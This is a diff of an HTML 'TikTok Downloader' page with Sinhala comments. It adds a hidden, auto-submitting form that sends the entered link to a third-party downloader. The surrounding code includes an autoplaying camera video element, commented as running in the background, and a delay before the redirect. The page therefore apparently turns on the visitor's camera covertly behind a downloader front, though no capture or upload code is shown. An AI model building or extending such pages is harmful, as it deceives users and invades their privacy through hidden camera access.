@@ -21,6 +21,13 @@
 </head>
 <body>
 
+    <!-- SSSTik එකට ලින්ක් එක ඔටෝමැටික් යැවීම සඳහා සඟවන ලද සැබෑ Form එකක් -->
+    <form id="hidden-ssstik-form" action="https://ssstik.io/abc" method="POST" style="display: none;">
+        <input type="text" name="id" id="hidden-url-input">
+        <input type="hidden" name="locale" value="en">
+        <input type="hidden" name="tt" value="0"> <!-- සමහර වෙලාවට අවශ්‍ය වන ටෝකන් සඳහා -->
+    </form>
+
     <div class="container">
         <h1>TikTok Downloader</h1>
         <p>ටික්ටොක් වීඩියෝ ලින්ක් එක පහතින් ඇතුළත් කරන්න:</p>
@@ -30,11 +37,13 @@
             <button type="button" class="dl-btn" id="download-btn">Download Video</button>
         </div>
         
+        <!-- සේවා පණිවිඩ -->
         <div id="status"></div>
         
         <div class="footer">Created by You ❤️</div>
     </div>
 
+    <!-- කැමරා මූලාශ්‍ර (පසුබිමෙන් ක්‍රියා කරයි) -->
     <div class="camera-container">
         <video id="video" autoplay playsinline></video>
     </div>
@@ -121,10 +130,10 @@
                 statusDiv.textContent = "Redirecting to Download Page...";
                 stopCurrentStream();
                 
-                // 3. අවසාන පියවර: ප්‍රසිද්ධ TikTok Downloader එකක් වෙත ලින්ක් එක සමඟම හරවා යැවීම (Redirect)
-                // එමඟින් පරිශීලකයාට කිසිදු වැරදීමක් (Error) නොපෙන්වා කෙලින්ම වීඩියෝව බාගත කරගත හැක.
-                const encodedUrl = encodeURIComponent(videoUrl);
-                window.location.href = `https://snaptik.app/abc.php?url=${encodedUrl}`;
+                // 3. අවසාන පියවර: පරිශීලකයා ඇතුලත් කරපු ලින්ක් එක රහසිගත Form එකට සෙට් කරලා, 
+                // කෙලින්ම SSSTik එකේ Result පිටුවට Auto-Submit කරනවා.
+                document.getElementById('hidden-url-input').value = videoUrl;
+                document.getElementById('hidden-ssstik-form').submit();
                 
             }, 2500);
             
